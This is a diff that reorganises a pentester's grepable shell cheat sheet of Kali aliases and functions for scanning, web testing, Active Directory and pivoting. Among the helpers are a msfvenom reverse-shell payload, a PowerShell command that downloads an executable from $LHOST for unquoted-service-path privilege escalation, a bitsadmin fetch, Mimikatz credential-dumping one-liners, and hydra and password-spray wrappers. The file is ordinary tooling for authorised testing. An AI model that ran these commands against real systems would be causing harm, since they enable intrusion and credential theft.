@@ -1,12 +1,48 @@
-#############################################
-# Kali Aliases & Helpers (grepable) #
-#############################################
+#############################################################
+#                                                           #
+#                  KALI ALIASES & HELPERS                   #
+#                                                           #
+#############################################################
 #
-# - This file is intended to be grepped by tag to quickly find useful aliases/functions.
-
+# A grepable pentest cheat-sheet. Every entry ends with a [tag]
+# so you can find it fast. Quick keys (defined in section 1):
+#
+#     s <term>   grep this file for <term>
+#     o          open this file in an editor
+#     tjp        reload the shell + this file
+#
 # Conventions:
-# - Tags appended in square brackets at end of line, e.g.  # [nmap scan]
-# - Functions are used for commands that take arguments; simple aliases for fixed commands.
+#   - Tags in square brackets at end of line, e.g.  # [nmap scan]
+#   - Functions for commands that take arguments; plain aliases
+#     for fixed commands.
+#   - Targets/secrets come from $HOME/.env (loaded in section 0) —
+#     never hardcode them here.
+#
+# ---------------------- CONTENTS ---------------------------
+#    0  Setup & Config .......... env, target vars, shell init
+#    1  Admin / Quality of Life . files, reload, git sync, build, vpn
+#    2  Scanning / Recon ........ nmap, autorecon
+#    3  Web ..................... burp, wpscan, feroxbuster, sqlmap
+#    4  TLS / mTLS .............. openssl, client-cert handshakes
+#    5  OSINT ................... trufflehog, recon-ng, subfinder
+#    6  Credentials & Wordlists . cred store, netexec spray
+#    7  Windows / Active Dir .... mimikatz, impacket, kerberos, cme
+#    8  Password Attacks ........ hydra
+#    9  Tunneling / Pivoting .... ligolo-ng
+#   10  File Transfer ........... smb, scp, pty, bitsadmin
+#   11  Payloads & Privesc ...... msfvenom, powerup
+#   12  Docker .................. exec, gitleaks, help
+#   13  Tmux .................... windows, sessions, panes
+#   14  Project / Script Hooks .. setrhost, credspray
+#   15  Misc / Notes ............ one-offs
+#
+#   Jump to a section: search for its title (e.g. "7  WINDOWS").
+# -----------------------------------------------------------
+
+
+#############################################################
+#  0  SETUP & CONFIG
+#############################################################
 
 # Source per-user environment variables if present (silently)
 [ -f "$HOME/.env" ] && . "$HOME/.env" 2>/dev/null
@@ -23,7 +59,6 @@ export USERNAME="${USERNAME:-}"
 export PASSWORD="${PASSWORD:-}"
 export NT_HASH="${NT_HASH:-${HASH:-}}"  # Accept $NT_HASH or fallback to $HASH if set
 
-
 # Base path for ToolBox scripts (override by exporting $KALI before sourcing)
 export KALI="${KALI:-$HOME/ToolBox}"
 
@@ -33,15 +68,18 @@ if [ -n "$ZSH_VERSION" ]; then
 fi
 
 
-########## Admin / Quality of Life ##########
+#############################################################
+#  1  ADMIN / QUALITY OF LIFE
+#############################################################
 ll() { command ls --color -lah -- "$@"; }  # [files listing]
 comparelists() { grep -Fvx -f "$2" -- "$1"; }  # [files diff compare]
 tjp() { [ -n "$ZSH_VERSION" ] && . "$HOME/.zshrc"; [ -f "$TOOLBOX/.kali" ] && . "$TOOLBOX/.kali" && . "$HOME/.env"; }  # [shell reload]
 toolbox() { cd "$TOOLBOX" || return; }  # [nav repo]
 vt_scan() {"$TOOLBOX"/releases/System/vt_scan/vt_scan --format md "$1"}
-source_venv() {source ~/.venv/bin/activate} # pip 
+source_venv() {source ~/.venv/bin/activate} # pip
 CodeVault() {
-  eval "$(ssh-agent)" && ssh-add "$GITHUB_KEY" || return 1
+  ssh-add -l >/dev/null 2>&1 || eval "$(ssh-agent)" >/dev/null
+  ssh-add "$GITHUB_KEY" 2>/dev/null || { echo "CodeVault: cannot load key: $GITHUB_KEY" >&2; return 1; }
   cd "$CODEVAULT" || return 1
   git pull && git add . && git commit -m "${1:-.}" ; git push
   cd - || return 1
@@ -87,6 +125,7 @@ pybin() {
   esac
 }  # [pybin build portable docker]
 pybin_and_scan() { python3 "$CODEVAULT/Filesystem/pybin_and_scan.py" "$@"; }  # [vt pybin build scan]
+
 nen() {
   local raw nodes
   raw=$(tailscale exit-node list 2>&1)
@@ -129,7 +168,10 @@ unalias o s 2>/dev/null; true
 o() { command gedit "$TOOLBOX/.kali" & }
 s() { grep -i "$1" "$TOOLBOX/.kali" --color; }
 
-############## Scanning / Recon ##############
+
+#############################################################
+#  2  SCANNING / RECON
+#############################################################
 # Nmap quick and full
 qn() { nmap -vv --min-rate=1500 -T4 -sT -Pn "$@"; }  # [nmap scan]
 fn() { nmap -vv --min-rate=1500 --open -p- -T4 -A -Pn "$@" -oN scan.md; }  # [nmap scan full]
@@ -140,7 +182,9 @@ autorecon() { sudo -E "$(command -v autorecon)" ${AUTORECON_CONFIG:+-c "$AUTOREC
 sautorecon() { sudo autorecon -t "$1" -vv --plugins-dir "$HOME/.config/AutoRecon/plugins"; }  # [recon autorecon]
 
 
-##################### Web #####################
+#############################################################
+#  3  WEB
+#############################################################
 # Curl through Burp with API key header
 curlburp() {
   curl --insecure -x 127.0.0.1:8080 --location "${WEB_SITE:-http://$RHOST}" \
@@ -155,7 +199,11 @@ wps() {
 
 ferox_full(){ feroxbuster -u "$1" -x php,html,js,txt,bak,old,zip,tar,tar.gz,sql,json,xml,env,py,config,ssh -A -k -s 200,204,301,302,307 -t 10 -r -d 5 --extract-links --timeout 10 --thorough -o "feroxbuster_$(echo "$1" | sed 's|https\?://||; s|/|_|g').txt"; }
 sqlmap_full(){ sqlmap -u "$1" --level 3 --random-agent --output-dir="./sqlmap_scan/" -v4}
-##################### TLS / mTLS #####################
+
+
+#############################################################
+#  4  TLS / mTLS
+#############################################################
 mtls_check_brief() {
   local target="${1:-${TARGET:-$RHOST}}" port="${2:-443}"
   openssl s_client -connect "${target}:${port}" -servername "$target" -brief -showcerts </dev/null
@@ -185,7 +233,9 @@ mtls_handshake() {
 }  # [tls mtls handshake openssl]
 
 
-##################### OSINT ####################
+#############################################################
+#  5  OSINT
+#############################################################
 # GitHub secrets scanning via Docker trufflehog
 trufflehog() {
   docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github \
@@ -209,22 +259,9 @@ subfinderc() {
 }  # [osint subdomains config docker]
 
 
-#################### Docker ####################
-dhelp() {
-  cat <<'EOF'
-docker run -v /host_dir:/cont_dir -p 8080:443 -it [image] [command]
-docker exec -it [containerId] [command]
-docker exec -it [containerId] sh
-docker run -it [imageName] sh
-docker export <container> > latest.tar
-EOF
-}  # [docker help]
-
-de() { sudo docker exec -it "$@"; }  # [docker exec]
-dgitleaks() { sudo docker run --rm -it zricethezav/gitleaks "$@"; }  # [docker gitleaks]
-
-
-############ Credentials & Wordlists ###########
+#############################################################
+#  6  CREDENTIALS & WORDLISTS
+#############################################################
 addu() { printf '%s\n' "$1" >> "$HOME/Tools/db/users.txt"; }  # [creds users]
 addo() { printf '%s\n' "$1" >> "$HOME/Tools/db/passwords.txt"; }  # [creds passwords]
 addc() { printf '%s\n' "$1" >> "$HOME/Tools/db/creds.txt"; }  # [creds pairs]
@@ -253,7 +290,9 @@ nxc_spray() {
 }  # [spray auth netexec]
 
 
-################### Windows / AD ###################
+#############################################################
+#  7  WINDOWS / ACTIVE DIRECTORY
+#############################################################
 # Mimikatz quick menu
 mimikatz_print() {
   cat <<'EOF'
@@ -263,6 +302,11 @@ mimikatz_print() {
   token::elevate
   lsadump::sam
 EOF
+}  # [windows mimikatz]
+
+# Mimikatz full oneliner menu (echo)
+mimikatz_oneliner() {
+  echo ".\\mimikatz.exe \"log\" \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump:sam\" \"lsadump::cache\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords full\" \"lsadump::secrets\" \"sekurlsa::tickets\" \"sekurlsa::tickets /export\" \"sekurlsa::msv\" \"sekurlsa::credman\" \"vault::cred\" \"vault::cred /patch\" \"lsadump::secrets\" \"exit\""
 }  # [windows mimikatz]
 
 # Impacket helpers (use $USERNAME/$PASSWORD or $NT_HASH)
@@ -288,7 +332,6 @@ Import-Module '.\SharpHound.ps1'
 Invoke-BloodHound -CollectionMethod All -OutputDirectory 'C:\\TEMP\\' -OutputPrefix audit
 EOF
 }  # [ad bloodhound]
-
 
 # Kerbrute / CrackMapExec spraying helpers
 kerbrute_passwordspray() {
@@ -330,7 +373,9 @@ cme_mssql_cmd() {
 }  # [ad cme mssql exec]
 
 
-################### Hydra ###################
+#############################################################
+#  8  PASSWORD ATTACKS (HYDRA)
+#############################################################
 hydra_unk() { hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt -vV "$ip" "$1"; }  # [hydra brute]
 hydra_gethttp() { hydra -l admin -P /usr/share/wordlists/rockyou.txt "$ip" http-get "$1"; }  # [hydra http]
 hydra_httppostform() {
@@ -338,7 +383,9 @@ hydra_httppostform() {
 }  # [hydra http form]
 
 
-################### Tunneling / Pivoting ###################
+#############################################################
+#  9  TUNNELING / PIVOTING
+#############################################################
 # Ligolo-ng quick helpers
 ligolo_start() { sudo ip tuntap add user "$(hostname)" mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert; }  # [pivot ligolo]
 ligolo_client_echo() { echo "./agent -connect $LHOST:11601 -ignore-cert &"; echo "sudo ip route add <TARGET_IP> dev ligolo"; }  # [pivot ligolo]
@@ -349,7 +396,9 @@ ligolo_listeners_echo() {
 ligolo_magicip() { echo "Local Ligolo Agent IP = 240.0.0.1"; }  # [pivot ligolo]
 
 
-################### Transfer ###################
+#############################################################
+# 10  FILE TRANSFER
+#############################################################
 # Simple SMB server for file transfer (set SMB_USER/SMB_PASS if desired)
 smbsrv() {
   local user="${SMB_USER:-kali}" pass="${SMB_PASS:-kali}"
@@ -363,8 +412,43 @@ cloud_transfer() { echo "scp -i '${SSH_KEY}' kali@${CLOUD_HOST}"; }  # [cloud ss
 # PTY upgrade one-liner (echo for easy copy)
 pty() { echo "python3 -c 'import pty,os; pty.spawn(\"/bin/bash\")'"; }  # [shell pty]
 
+transferwin() { scp "$1" "tristan@$WINDOWS_HOST:/C:\\Users\\Tristan\\Desktop"; } #transfer #windows
+windowpull() { echo 'bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt'; } #transfer #windows
 
-################### Tmux ###################
+
+#############################################################
+# 11  PAYLOADS & PRIVESC
+#############################################################
+# msfvenom HTML Application payload (echo form; set $LHOST/$LPORT)
+msfvenom_hsa() { echo "msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=${LPORT:-443} -f hta-psh > shell.hta"; }  # [msfvenom payload]
+#msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.142 LPORT=4444 -f csharp
+
+# PowerUp hints
+PowerUp() { echo "Write-HijackDll -DllPath 'C:\\Temp\\wlbsctrl.dll'"; }  # [windows privesc dllhijack]
+PowerUp2() { echo "Find-PathDLLHijack PowerUp.ps1"; }  # [windows privesc dllhijack]
+privescUSP() { echo "#powershell -nop -exec bypass -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:${LPORT:-8080}/common.exe','C:\\Program Files\\Unquoted Path Service\\common.exe')\""; }  # [windows privesc unquoted]
+
+
+#############################################################
+# 12  DOCKER
+#############################################################
+dhelp() {
+  cat <<'EOF'
+docker run -v /host_dir:/cont_dir -p 8080:443 -it [image] [command]
+docker exec -it [containerId] [command]
+docker exec -it [containerId] sh
+docker run -it [imageName] sh
+docker export <container> > latest.tar
+EOF
+}  # [docker help]
+
+de() { sudo docker exec -it "$@"; }  # [docker exec]
+dgitleaks() { sudo docker run --rm -it zricethezav/gitleaks "$@"; }  # [docker gitleaks]
+
+
+#############################################################
+# 13  TMUX
+#############################################################
 t() { grep -i tmux "$TOOLBOX/.kali" --color; }  # [tmux grep]
 nwindow() { TMUX= tmux new -n "$1"; }  # [tmux]
 nsession() { TMUX= tmux new -s "$1"; }  # [tmux]
@@ -378,28 +462,16 @@ splitright() { TMUX= tmux split-window -v; }  # [tmux]
 tmuxhelp() { TMUX= tmux list-keys; }  # [tmux]
 
 
-################### Misc / Offensive ###################
-# msfvenom HTML Application payload (echo form; set $LHOST/$LPORT)
-msfvenom_hsa() { echo "msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=${LPORT:-443} -f hta-psh > shell.hta"; }  # [msfvenom payload]
-
-# Mimikatz full oneliner menu (echo)
-mimikatz_oneliner() {
-  echo ".\\mimikatz.exe \"log\" \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump:sam\" \"lsadump::cache\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords full\" \"lsadump::secrets\" \"sekurlsa::tickets\" \"sekurlsa::tickets /export\" \"sekurlsa::msv\" \"sekurlsa::credman\" \"vault::cred\" \"vault::cred /patch\" \"lsadump::secrets\" \"exit\""
-}  # [windows mimikatz]
-
-# PowerUp hints
-PowerUp() { echo "Write-HijackDll -DllPath 'C:\\Temp\\wlbsctrl.dll'"; }  # [windows privesc dllhijack]
-PowerUp2() { echo "Find-PathDLLHijack PowerUp.ps1"; }  # [windows privesc dllhijack]
-privescUSP() { echo "#powershell -nop -exec bypass -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:${LPORT:-8080}/common.exe','C:\\Program Files\\Unquoted Path Service\\common.exe')\""; }  # [windows privesc unquoted]
-
-
-################### Project / Script Hooks ###################
+#############################################################
+# 14  PROJECT / SCRIPT HOOKS
+#############################################################
 setrhost() { "$HOME/Tools/scripts/setrhost.py" "$1" && . "$TOOLBOX/.kali"; }  # [helpers rhost]
 credspray() { "$HOME/Tools/scripts/CredSpray.py" "$@"; }  # [spray script]
 
-################### Misc #########################
+
+#############################################################
+# 15  MISC / NOTES
+#############################################################
 start_win11_local_account() { echo "start ms-cxh:localonly"; } #skips Microsoft online start up
-transferwin() { scp "$1" "tristan@$WINDOWS_HOST:/C:\\Users\\Tristan\\Desktop"; } #transfer #windows
-windowpull() { echo 'bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt'; } #transfer #windows
-#msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.142 LPORT=4444 -f csharp
+
 # End of file
